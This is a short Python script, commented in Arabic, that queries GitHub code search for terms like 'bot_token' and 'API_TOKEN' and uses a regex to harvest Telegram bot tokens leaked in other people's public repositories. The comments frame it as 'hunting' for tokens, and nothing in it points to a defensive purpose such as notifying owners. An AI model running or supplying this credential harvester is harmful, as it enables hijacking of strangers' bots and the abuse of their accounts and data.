import re
from github import Github

def search_for_tokens(token):
    g = Github(token)
    
    # استراتيجية البحث: التنويع في الكلمات المفتاحية يرفع فرص الصيد
    # استخدام نمط "token=" أو "API" يجعل النتائج أكثر دقة
    queries = [
        'token language:python',
        'bot_token language:python',
        'telegram_token language:python',
        'token language:javascript',
        'API_TOKEN language:python'
    ]
    
    found_tokens = []
    
    for query in queries:
        try:
            # البحث في الـ Code فقط
            result = g.search_code(query=query, sort='indexed', order='desc')
            
            # معالجة أول 10 نتائج من كل استعلام (بدلاً من 20 عشوائية)
            for content_file in result[:10]:
                try:
                    content = content_file.decoded_content.decode('utf-8')
                    # هذا النمط أدق وأكثر شمولاً لتوكنات التيليجرام
                    tokens = re.findall(r'\d{8,12}:[a-zA-Z0-9_\-]{35}', content)
                    found_tokens.extend(tokens)
                except:
                    continue
        except Exception as e:
            # إذا وصلنا للـ Rate Limit، سيتخطى الاستعلام الحالي
            continue
            
    return list(set(found_tokens))
